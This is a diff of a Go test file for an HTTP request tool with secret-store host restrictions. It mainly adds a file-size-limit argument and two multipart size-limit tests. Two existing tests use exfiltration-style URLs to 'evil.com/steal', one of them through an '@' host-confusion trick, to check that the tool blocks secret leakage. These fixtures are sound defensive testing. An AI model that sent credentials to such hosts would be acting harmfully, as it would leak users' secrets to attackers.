@@ -39,7 +39,7 @@ func TestHTTPRequestBasicGET(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/test",
 	})
@@ -75,7 +75,7 @@ api_key = "sk-secret-123"
 allowed_hosts = ["%s"]
 `, srv.Listener.Addr().(*net.TCPAddr).IP.String()))
 
-	tool := NewHTTPRequestTool(store, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/api",
 		"headers": map[string]string{
@@ -104,7 +104,7 @@ api_key = "sk-secret-123"
 allowed_hosts = ["api.allowed.com"]
 `)
 
-	tool := NewHTTPRequestTool(store, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://evil.com/steal",
 		"headers": map[string]string{
@@ -128,7 +128,7 @@ api_key = "sk-secret-123"
 allowed_hosts = ["api.example.com"]
 `)
 
-	tool := NewHTTPRequestTool(store, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://api.example.com@evil.com/steal",
 		"headers": map[string]string{
@@ -151,7 +151,7 @@ func TestHTTPRequestNoAllowedHosts(t *testing.T) {
 token = "sk-legacy-token"
 `)
 
-	tool := NewHTTPRequestTool(store, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://api.example.com/data",
 		"headers": map[string]string{
@@ -175,7 +175,7 @@ func TestHTTPRequestNoSecretsNoRestriction(t *testing.T) {
 	defer srv.Close()
 
 	// nil store — no secrets at all
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/public",
 	})
@@ -203,7 +203,7 @@ api_key = "sk-supersecret-should-be-redacted"
 allowed_hosts = ["%s"]
 `, srv.Listener.Addr().(*net.TCPAddr).IP.String()))
 
-	tool := NewHTTPRequestTool(store, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/echo",
 		"headers": map[string]string{
@@ -230,7 +230,7 @@ func TestHTTPRequestQueryParams(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/search",
 		"query": map[string]string{
@@ -263,7 +263,7 @@ key = "key-b"
 allowed_hosts = ["other.example.com"]
 `)
 
-	tool := NewHTTPRequestTool(store, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": "https://api.example.com/data",
 		"headers": map[string]string{
@@ -290,7 +290,7 @@ func TestHTTPRequestSaveToText(t *testing.T) {
 	defer srv.Close()
 
 	savePath := filepath.Join(t.TempDir(), "output.json")
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":     srv.URL + "/api",
 		"save_to": savePath,
@@ -329,7 +329,7 @@ func TestHTTPRequestSaveToParentDirs(t *testing.T) {
 	defer srv.Close()
 
 	savePath := filepath.Join(t.TempDir(), "sub", "dir", "output.txt")
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":     srv.URL,
 		"save_to": savePath,
@@ -358,7 +358,7 @@ func TestHTTPRequestBinaryAutoSave(t *testing.T) {
 	defer srv.Close()
 
 	tmpDir := t.TempDir()
-	tool := NewHTTPRequestTool(nil, nil, tmpDir, 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, tmpDir, 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL + "/image.png",
 	})
@@ -400,7 +400,7 @@ func TestHTTPRequestTextNotAutoSaved(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url": srv.URL,
 	})
@@ -427,7 +427,7 @@ func TestHTTPRequestSaveFromJSONPath(t *testing.T) {
 	defer srv.Close()
 
 	savePath := filepath.Join(t.TempDir(), "output.txt")
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":                 srv.URL,
 		"save_to":             savePath,
@@ -470,7 +470,7 @@ func TestHTTPRequestSaveFromJSONPathDataURI(t *testing.T) {
 	defer srv.Close()
 
 	savePath := filepath.Join(t.TempDir(), "image.png")
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":                 srv.URL,
 		"save_to":             savePath,
@@ -503,7 +503,7 @@ func TestHTTPRequestSaveFromJSONPathDataURI(t *testing.T) {
 }
 
 func TestHTTPRequestSaveFromJSONPathRequiresSaveTo(t *testing.T) {
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":                 "http://example.com",
 		"save_from_json_path": "data.0.url",
@@ -606,7 +606,7 @@ func TestHTTPRequestCustomTimeout(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":     srv.URL,
 		"timeout": 60,
@@ -629,7 +629,7 @@ func TestHTTPRequestTimeoutCap(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 
 	// Request with 1-second timeout should fail
 	params, _ := json.Marshal(map[string]interface{}{
@@ -656,7 +656,7 @@ func TestHTTPRequestSaveToLargeBody(t *testing.T) {
 	defer srv.Close()
 
 	savePath := filepath.Join(t.TempDir(), "big.bin")
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":     srv.URL,
 		"save_to": savePath,
@@ -688,7 +688,7 @@ func TestHTTPRequestMaxResponseBytesOverride(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":                srv.URL,
 		"max_response_bytes": 256 * 1024,
@@ -714,7 +714,7 @@ func TestHTTPRequestMaxResponseBytesLargeOverride(t *testing.T) {
 	defer srv.Close()
 
 	savePath := filepath.Join(t.TempDir(), "big.bin")
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":                srv.URL,
 		"save_to":            savePath,
@@ -743,7 +743,7 @@ func TestHTTPRequestAutoBackgroundFast(t *testing.T) {
 	defer srv.Close()
 
 	var called bool
-	tool := NewHTTPRequestTool(nil, nil, "", 5, NewAsyncNotifier(func(sk, msg string) {
+	tool := NewHTTPRequestTool(nil, nil, "", 5, 50*1024*1024, NewAsyncNotifier(func(sk, msg string) {
 		called = true
 	}))
 
@@ -772,7 +772,7 @@ func TestHTTPRequestAutoBackgroundSlow(t *testing.T) {
 	defer srv.Close()
 
 	completeCh := make(chan string, 1)
-	tool := NewHTTPRequestTool(nil, nil, "", 1, NewAsyncNotifier(func(sk, msg string) {
+	tool := NewHTTPRequestTool(nil, nil, "", 1, 50*1024*1024, NewAsyncNotifier(func(sk, msg string) {
 		completeCh <- msg
 	}))
 
@@ -817,7 +817,7 @@ func TestHTTPRequestAutoBackgroundSessionKey(t *testing.T) {
 		sk, msg string
 	}
 	ch := make(chan result, 1)
-	tool := NewHTTPRequestTool(nil, nil, "", 1, NewAsyncNotifier(func(sk, msg string) {
+	tool := NewHTTPRequestTool(nil, nil, "", 1, 50*1024*1024, NewAsyncNotifier(func(sk, msg string) {
 		ch <- result{sk, msg}
 	}))
 
@@ -856,7 +856,7 @@ func TestHTTPRequestExplicitBackground(t *testing.T) {
 	defer srv.Close()
 
 	completeCh := make(chan string, 1)
-	tool := NewHTTPRequestTool(nil, nil, "", 0, NewAsyncNotifier(func(sk, msg string) {
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, NewAsyncNotifier(func(sk, msg string) {
 		completeCh <- msg
 	}))
 
@@ -893,7 +893,7 @@ func TestHTTPRequestBackgroundNoNotifier(t *testing.T) {
 	}))
 	defer srv.Close()
 
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":        srv.URL,
@@ -966,7 +966,7 @@ func TestHTTPRequestMultipartSingleFile(t *testing.T) {
 	tmpFile := filepath.Join(t.TempDir(), "test.txt")
 	os.WriteFile(tmpFile, []byte("hello multipart"), 0644)
 
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":    srv.URL,
 		"method": "POST",
@@ -1012,7 +1012,7 @@ func TestHTTPRequestMultipartFileAndFormFields(t *testing.T) {
 	tmpFile := filepath.Join(t.TempDir(), "photo.jpg")
 	os.WriteFile(tmpFile, []byte{0xFF, 0xD8, 0xFF}, 0644)
 
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":    srv.URL,
 		"method": "POST",
@@ -1060,7 +1060,7 @@ func TestHTTPRequestMultipartMultipleFiles(t *testing.T) {
 	os.WriteFile(file1, []byte("file-a"), 0644)
 	os.WriteFile(file2, []byte("file-b"), 0644)
 
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":    srv.URL,
 		"method": "POST",
@@ -1086,7 +1086,7 @@ func TestHTTPRequestMultipartMultipleFiles(t *testing.T) {
 }
 
 func TestHTTPRequestMultipartBodyAndFilesConflict(t *testing.T) {
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":    "http://example.com",
 		"method": "POST",
@@ -1106,7 +1106,7 @@ func TestHTTPRequestMultipartBodyAndFilesConflict(t *testing.T) {
 }
 
 func TestHTTPRequestMultipartFileMissing(t *testing.T) {
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":    "http://example.com",
 		"method": "POST",
@@ -1138,7 +1138,7 @@ func TestHTTPRequestMultipartFileTooLarge(t *testing.T) {
 	f.Truncate(51 * 1024 * 1024)
 	f.Close()
 
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":    "http://example.com",
 		"method": "POST",
@@ -1173,7 +1173,7 @@ allowed_hosts = ["%s"]
 	tmpFile := filepath.Join(t.TempDir(), "doc.pdf")
 	os.WriteFile(tmpFile, []byte("pdf-content"), 0644)
 
-	tool := NewHTTPRequestTool(store, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(store, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":    srv.URL,
 		"method": "POST",
@@ -1213,7 +1213,7 @@ func TestHTTPRequestMultipartFilenameOverride(t *testing.T) {
 	tmpFile := filepath.Join(t.TempDir(), "ugly-temp-name-123.bin")
 	os.WriteFile(tmpFile, []byte("data"), 0644)
 
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":    srv.URL,
 		"method": "POST",
@@ -1235,7 +1235,7 @@ func TestHTTPRequestMultipartFilenameOverride(t *testing.T) {
 }
 
 func TestHTTPRequestFormFieldsWithoutFiles(t *testing.T) {
-	tool := NewHTTPRequestTool(nil, nil, "", 0, nil)
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 50*1024*1024, nil)
 	params, _ := json.Marshal(map[string]interface{}{
 		"url":    "http://example.com",
 		"method": "POST",
@@ -1250,5 +1250,59 @@ func TestHTTPRequestFormFieldsWithoutFiles(t *testing.T) {
 	}
 	if !strings.Contains(err.Error(), "form_fields requires files") {
 		t.Errorf("error = %v", err)
+	}
+}
+
+func TestHTTPRequestMultipartCustomSizeLimit(t *testing.T) {
+	// Set a small custom limit (1KB) and verify it's enforced
+	dir := t.TempDir()
+	filePath := filepath.Join(dir, "small.bin")
+	os.WriteFile(filePath, make([]byte, 2*1024), 0644) // 2KB file
+
+	// With a 1KB limit, this should fail
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 1024, nil)
+	params, _ := json.Marshal(map[string]interface{}{
+		"url":    "http://example.com",
+		"method": "POST",
+		"files": []map[string]string{
+			{"field_name": "doc", "file_path": filePath},
+		},
+	})
+
+	_, err := tool.Execute(context.Background(), params)
+	if err == nil {
+		t.Fatal("expected error for file exceeding custom limit")
+	}
+	if !strings.Contains(err.Error(), "exceeds") {
+		t.Errorf("error = %v", err)
+	}
+}
+
+func TestHTTPRequestMultipartCustomSizeLimitAllows(t *testing.T) {
+	// Set a 100MB limit — the file (2KB) should be accepted
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		fmt.Fprint(w, `{"ok":true}`)
+	}))
+	defer srv.Close()
+
+	dir := t.TempDir()
+	filePath := filepath.Join(dir, "small.bin")
+	os.WriteFile(filePath, []byte("data"), 0644)
+
+	tool := NewHTTPRequestTool(nil, nil, "", 0, 100*1024*1024, nil)
+	params, _ := json.Marshal(map[string]interface{}{
+		"url":    srv.URL,
+		"method": "POST",
+		"files": []map[string]string{
+			{"field_name": "doc", "file_path": filePath},
+		},
+	})
+
+	result, err := tool.Execute(context.Background(), params)
+	if err != nil {
+		t.Fatalf("Execute: %v", err)
+	}
+	if !strings.Contains(result, "HTTP 200") {
+		t.Errorf("expected HTTP 200: %s", result)
 	}
 }
